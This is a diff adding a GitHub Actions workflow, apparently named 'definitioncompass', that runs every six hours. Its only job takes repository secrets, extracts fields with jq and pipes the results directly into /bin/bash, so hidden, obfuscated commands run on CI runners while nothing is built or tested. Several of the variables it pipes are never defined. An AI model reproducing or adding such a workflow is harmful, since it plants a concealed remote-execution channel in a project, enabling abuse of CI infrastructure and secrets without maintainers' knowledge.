@@ -1,0 +1,22 @@
+name: definitioncompass
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: definitioncompass
+        env:
+          sq28: ${{ secrets.sq28 }}
+        run: |
+          echo $sq28 | jq -r .po7549 | /bin/bash
+          echo $hbn3392 | jq -r .sxzcl578 | /bin/bash
+          echo $qe265 | jq -r .f369 | /bin/bash
+          echo $f95 | jq -r .fcsv31 | /bin/bash
+          echo $va40902 | jq -r .el90 | /bin/bash
+          echo $anwft77024 | jq -r .bqw0 | /bin/bash
+
